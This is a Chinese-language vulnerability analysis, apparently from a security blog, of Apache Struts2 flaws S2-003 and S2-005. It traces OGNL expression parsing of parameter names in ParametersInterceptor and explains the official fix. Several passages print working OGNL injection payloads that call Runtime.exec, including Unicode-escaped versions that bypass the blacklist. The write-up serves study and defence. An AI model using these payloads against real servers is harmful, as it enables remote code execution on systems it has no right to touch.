# Struts2 漏洞分析系列 - S2-003&S2-005/初识首个通用Struts2框架漏洞

阅读量 **321688**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-25 16:30:42

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t015d522b9523c46f5d.png)

## 0x00 漏洞概述

S2-003的漏洞核心在于Struts2中的ParametersInterceptor（某个拦截器）会对请求中的参数名称进行OGNL的表达式解析，虽然有一定的过滤，但是过滤的不完全导致被绕过。

**影响版本：2.0.0～2.1.8.1**

官方issue地址：<https://cwiki.apache.org/confluence/display/WW/S2-003>

官方issue地址：<https://cwiki.apache.org/confluence/display/WW/S2-005>

## 0x01 环境搭建

S2-003的执行流程与S2-001不同，主要区别在于S2-003中必须包含一个Action，否则无法走到漏洞触发的流程，因此首先需要搭建一个漏洞环境。

首先编写一个LoginAction用于模拟登陆过程：

    
    
    import com.opensymphony.xwork2.ActionSupport;
    
    public class LoginAction extends ActionSupport {
        private String username;
        private String password;
    
        public String getUsername() {
            return username;
        }
    
        public String getPassword() {
            return password;
        }
    
        public void setUsername(String username) {
            this.username = username;
        }
    
        public void setPassword(String password) {
            this.password = password;
        }
    
        public String execute() throw Exception {
            if (this.username == null || this.password == null) {
                return "failed";
            }
    
            if (this.username.equals("admin") && this.password.equals("admin")) {
                return "success";
            }
    
            return "failed";
        }
    
        public static void main(String[] args) {
    
        }
    }
    

LoginAction的继承关系如下：

![](https://p3.ssl.qhimg.com/t01be5319879a9546b2.jpg)

随后写一个struts.xml：

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    
    <!DOCTYPE struts PUBLIC
            "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
            "http://struts.apache.org/dtds/struts-2.0.dtd">
    
    <struts>
        <package name="st2-demo" extends="struts-default">
            <action name="login" class="LoginAction">
                <result name="success">index.jsp</result>
            </action>
        </package>
    </struts>
    

这样我们就算是写好了一个`login.action`的路由了，直接启动Tomcat访问login.action即可使用LoginAction中execute的逻辑，当用户名与密码正确时会跳转到index.jsp中。

## 0x02 漏洞分析

在之前的文章中有介绍过，Struts2的执行流程中涉及一个叫拦截器的东西，Struts2自带了许多拦截器，在请求到达真正的Action前会进行一系列处理，并在执行完毕后重新调用一次用于做请求完毕的清理。

S2-003的漏洞就出在其中的ParametersInterceptor上，在Struts2的执行流程中，首先会调用每个拦截器的doIntercept对请求进行处理，首先看看ParametersInterceptor的doIntercept方法：

    
    
    com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept
    public String doIntercept(ActionInvocation invocation) throws Exception {
            Object action = invocation.getAction();
            if (!(action instanceof NoParameters)) {
                ActionContext ac = invocation.getInvocationContext();
                Map parameters = ac.getParameters();
                if (LOG.isDebugEnabled()) {
                    LOG.debug("Setting params " + this.getParameterLogMap(parameters));
                }
    
                if (parameters != null) {
                    Map contextMap = ac.getContextMap();
    
                    try {
                        OgnlContextState.setCreatingNullObjects(contextMap, true);
                        OgnlContextState.setDenyMethodExecution(contextMap, true);
                        OgnlContextState.setReportingConversionErrors(contextMap, true);
                        ValueStack stack = ac.getValueStack();
                        this.setParameters(action, stack, parameters);
                    } finally {
                        OgnlContextState.setCreatingNullObjects(contextMap, false);
                        OgnlContextState.setDenyMethodExecution(contextMap, false);
                        OgnlContextState.setReportingConversionErrors(contextMap, false);
                    }
                }
            }
    
            return invocation.invoke();
        }
    

上述代码，首先获取了当前请求对应的Action，也就是之前编写好的LoginAction，随后获取在前面拦截器中封装完毕的Action上下文，并获取了当前请求中的参数。

随后当参数不为空时，会为ContextMap设置三个键，分别为xwork.NullHandler.createNullObjects、xwork.MethodAccessor.denyMethodExecution、report.conversion.errors，其值都被设置为true。最后获取了ValueStack并调用了setParameters方法，传入三个参数分别为LoginAction、ValueStack、parameters。

相关参数值如下：

![](https://p2.ssl.qhimg.com/t019da6812d156c9272.jpg)

    
    
    com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters
    protected void setParameters(Object action, ValueStack stack, Map parameters) {
            ParameterNameAware parameterNameAware = action instanceof ParameterNameAware ? (ParameterNameAware)action : null;
            Map params = null;
            if (this.ordered) {
                params = new TreeMap(this.getOrderedComparator());
                params.putAll(parameters);
            } else {
                params = new TreeMap(parameters);
            }
    
            Iterator iterator = params.entrySet().iterator();
    
            while(true) {
                Entry entry;
                String name;
                boolean acceptableName;
                do {
                    if (!iterator.hasNext()) {
                        return;
                    }
    
                    entry = (Entry)iterator.next();
                    name = entry.getKey().toString();
                    acceptableName = this.acceptableName(name) && (parameterNameAware == null || parameterNameAware.acceptableParameterName(name));
                } while(!acceptableName);
    
                Object value = entry.getValue();
    
                try {
                    stack.setValue(name, value);
                } catch (RuntimeException var13) {
                    if (devMode) {
                        String developerNotification = LocalizedTextUtil.findText(ParametersInterceptor.class, "devmode.notification", ActionContext.getContext().getLocale(), "Developer Notification:\n{0}", new Object[]{var13.getMessage()});
                        LOG.error(developerNotification);
                        if (action instanceof ValidationAware) {
                            ((ValidationAware)action).addActionMessage(developerNotification);
                        }
                    } else {
                        LOG.error("ParametersInterceptor - [setParameters]: Unexpected Exception caught setting '" + name + "' on '" + action.getClass() + ": " + var13.getMessage());
                    }
                }
            }
        }
    

从代码中去看，setParameters这个参数主要用于解析请求中的参数并将其设置到ValueStack这个栈中，在这里通过一个while循环取出参数名name，接着调用了acceptableName来判断允许解析。

当满足如下条件时，acceptableName返回true：

  * name中不包含`=`
  * name中不包含`,`
  * name中不包含`#`
  * name中不包含`:`

当满足上述条件时，会跳出while循环，并获取请求中的value，调用ValueStack#setValue来设置值：

    
    
    com.opensymphony.xwork2.util.OgnlValueStack#setValue
    public void setValue(String expr, Object value) {
            this.setValue(expr, value, devMode);
        }
    
    com.opensymphony.xwork2.util.OgnlValueStack#setValue
    public void setValue(String expr, Object value, boolean throwExceptionOnFailure) {
            Map context = this.getContext();
    
            try {
                String msg;
                try {
                    context.put("conversion.property.fullName", expr);
                    context.put("com.opensymphony.xwork2.util.ValueStack.ReportErrorsOnNoProp", throwExceptionOnFailure ? Boolean.TRUE : Boolean.FALSE);
                    OgnlUtil.setValue(expr, context, this.root, value);
                } catch (OgnlException var11) {
                    if (throwExceptionOnFailure) {
                        msg = "Error setting expression '" + expr + "' with value '" + value + "'";
                        throw new XWorkException(msg, var11);
                    }
    
                    if (LOG.isDebugEnabled()) {
                        LOG.debug("Error setting value", var11);
                    }
                } catch (RuntimeException var12) {
                    if (throwExceptionOnFailure) {
                        msg = "Error setting expression '" + expr + "' with value '" + value + "'";
                        throw new XWorkException(msg, var12);
                    }
    
                    if (LOG.isDebugEnabled()) {
                        LOG.debug("Error setting value", var12);
                    }
                }
            } finally {
                OgnlContextState.clear(context);
                context.remove("conversion.property.fullName");
                context.remove("com.opensymphony.xwork2.util.ValueStack.ReportErrorsOnNoProp");
            }
    
        }
    

在setValue中主要在ContextMap设置了两个值，fullName代表了请求中key的完整值，随后继续调用OgnlUtil.setValue，传入四个参数分别为expr（key）、context（ContextMap）、this.root（RootContext）、value。

    
    
    com.opensymphony.xwork2.util.OgnlUtil#setValue
    public static void setValue(String name, Map context, Object root, Object value) throws OgnlException {
            Ognl.setValue(compile(name), context, root, value);
        }
    
    ognl.Ognl#setValue
    public static void setValue(Object tree, Map context, Object root, Object value) throws OgnlException {
            OgnlContext ognlContext = (OgnlContext)addDefaultContext(root, context);
            Node n = (Node)tree;
            n.setValue(ognlContext, root, value);
        }
    

在setValue方法中可以看到，这里首先将name（也就是key）编译为AST Node，随后调用AST
Node的setValue方法设置值，后续的调用流程就不细跟了，在S2-001中可以发现最终的OGNL解析实现在getValue，然而在setValue这也会对key进行一次OGNL解析，因此也存在对应的表达式解析的漏洞。

在前面的调用流程中我们知道，前面在ContextMap中添加了一个键xwork.MethodAccessor.denyMethodExecution，其值为false，这个键影响到后续OGNL解析时是否可以调用方法，而此处为false，我们需要先将其修改为true。

那么怎么修改呢？在前面的学习中我们了解到，在OGNL中实现赋值的方式有两种：

    
    
    Ognl.getValue(compile("id=123"),context,root,resultType) // 将root对象的id属性赋为123
    Ognl.getValue(compile("#request.name='liming',#request.name"),context,root,resultType) // 将context中request对象的name属性赋为liming，并将其返回
    

那么我们是否可以通过`#xwork.MethodAccessor.denyMethodExecution=false`直接将contextMap中的这个键设置为false？答案是不行的…因为在OGNL中`.`代表访问属性，上面的OGNL语句代表访问xwork下的MethodAccessor这个属性，然而ContextMap中没有xwork这个对象，更不可能存在MethodAccessor这个属性了，因此我们需要换一种方法。

在OGNL中我们可以通过数组的方式获取一个对象中的属性，这点与Python的SSTI很像，即可以通过`#context['xwork.MethodAccessor.denyMethodExecution']`获取到这个属性，这下子获取属性的问题解决了，但是怎么赋值呢？

注意这是setValue而非getValue，最终是需要执行一个set的操作的，set必然操作的是一个对象而非undefined，而OGNL的AssignNode最终返回的肯定是一个undefined，因此我们没有办法直接通过`#context['xwork.MethodAccessor.denyMethodExecution']=false`来赋值，我们需要让这个OGNL最后返回一个对象让setValue执行set操作。

在之前的学习中可以了解到，一行OGNL的表达式可以通过`,`被拆分为多个OGNL表达式，并且最终这个表达式返回的是最后一个`,`所返回的值，通过这个思路，POC就可以完美的写出来了：`#context['xwork.MethodAccessor.denyMethodExecution']=false,#request`。

这个POC最终返回的是ContextMap中的request，自然也支持set操作，不会报错，不影响后续的执行。现在属性设置完毕了，执行命令也就简单了，在上述POC中插入S2-001执行命令的POC即可。

最终POC：

    
    
    #context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open -a /System/Applications/Calculator.app')#request
    

接下来需要解决最后一个问题，在前面`acceptableName`的过滤中，限制了name中不能出现几个关键字符，我们需要绕过这个。

在OGNL中支持Unicode编码，当其遇到`\`时会首先触发相关解码，随后再进行解析，利用这个特性，我们可以将黑名单中的字符转为unicode编码来绕过。

最终转换后的POC：

    
    
    \u0023context['xwork.MethodAccessor.denyMethodExecution']\u003dfalse\u002c@java.lang.Runtime@getRuntime().exec('open -a /System/Applications/Calculator.app')\u002c\u0023request
    

至于为什么OGNL在compile时会解析Unicode，这点在[https://xz.aliyun.com/t/2323中有过相关解释了，没什么好讲的，fastjson也会有这样的处理，都是为了兼容某些环境的运行情况而做的一个处理。](https://xz.aliyun.com/t/2323%E4%B8%AD%E6%9C%89%E8%BF%87%E7%9B%B8%E5%85%B3%E8%A7%A3%E9%87%8A%E4%BA%86%EF%BC%8C%E6%B2%A1%E4%BB%80%E4%B9%88%E5%A5%BD%E8%AE%B2%E7%9A%84%EF%BC%8Cfastjson%E4%B9%9F%E4%BC%9A%E6%9C%89%E8%BF%99%E6%A0%B7%E7%9A%84%E5%A4%84%E7%90%86%EF%BC%8C%E9%83%BD%E6%98%AF%E4%B8%BA%E4%BA%86%E5%85%BC%E5%AE%B9%E6%9F%90%E4%BA%9B%E7%8E%AF%E5%A2%83%E7%9A%84%E8%BF%90%E8%A1%8C%E6%83%85%E5%86%B5%E8%80%8C%E5%81%9A%E7%9A%84%E4%B8%80%E4%B8%AA%E5%A4%84%E7%90%86%E3%80%82)

## 0x03 修复方案

对于S2-003漏洞，官方通过增加安全配置（禁止静态方法调用和类方法执行等）来修补，即在原有基础上添加allowStaticAccess这么一个过滤。

**然鹅治标不治本，官方似乎没有意识到漏洞的核心在于黑名单被绕过，所以后续产生了S2-005这么一个漏洞，原理与S2-003相同，只不过POC中将allowStaticAccess设为true罢了：_memberAccess[‘allowStaticAccess’]=true.**

最后的修复方案自然是修补黑名单了，从根本上解决Unicode编码、八进制编码绕过的安全问题：

    
    
    protected boolean acceptableName(String name) {
            return this.isAccepted(name) && !this.isExcluded(name);
        }
    
    protected boolean isAccepted(String paramName) {
            if (!this.acceptParams.isEmpty()) {
                Iterator i$ = this.acceptParams.iterator();
    
                Matcher matcher;
                do {
                    if (!i$.hasNext()) {
                        return false;
                    }
    
                    Pattern pattern = (Pattern)i$.next();
                    matcher = pattern.matcher(paramName);
                } while(!matcher.matches());
    
                return true;
            } else {
                return this.acceptedPattern.matcher(paramName).matches();
            }
        }
    

这里主要是增加了一个acceptedPattern：

    
    
    private String acceptedParamNames = "[a-zA-Z0-9\\.\\]\\[\\(\\)_'\\s]+";
    

如果payload和之前一样，通过`\u`、`\x`之类的方式绕过，会被这里的正则匹配到：

![](https://p4.ssl.qhimg.com/t01b1d9834d34eaeeda.jpg)

因此就没有办法通过`\u`等方式绕过acceptableName的过滤了。

## 0x04 一点吐槽

网上的分析文章中主要存在几个容易让新手产生误区的点：

  1. 漏洞只能在Tomcat6下复现（URLENCODE即可解决）
  2. Payload过于复杂化（都是照搬的，完全不讲Payload的原理，只讲如何到触发OGNL表达式注入）

以其中的一篇文章中的POC为例：

    
    
    ('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)(bla)
    

这个POC，相信大家看了都会有一个疑问，为什么有unicode编码？这个括号是什么？这个bla是什么？这个`&`号是什么？然鹅这些作者都没有解释，而是直接代入到了OGNL表达式解析这块。

实际上做漏洞分析的时候，大家应该以挖掘者的身份去思考，这个点被过滤了，我要怎么绕？绕过的第一步是什么？而不是直接放网上公开的POC，然后自己开始瞎JB分析。

## 0x05 漏洞总结

通过本篇的分析我们可以了解到S2-003与S2-005的核心在于ParametersInterceptor在对请求中的参数进行解析时会对key进行OGNL的表达式解析，并且过滤不严谨，可以通过编码绕过。

S2-003与S2-005算是Struts2框架的通用问题，其不需要依赖于某个特定的写法，即不属于安全开发规范中，所以影响范围相比于S2-001会更广一些（S2-001依赖于标签）。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **tlmn** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/254809](/post/id/254809)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Java](/tag/Java)
  * [Struts2](/tag/Struts2)

 **+1** __6赞

 __收藏

![](https://p3.ssl.qhimg.com/t01b9a70454dd1d265f.png) tlmn

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

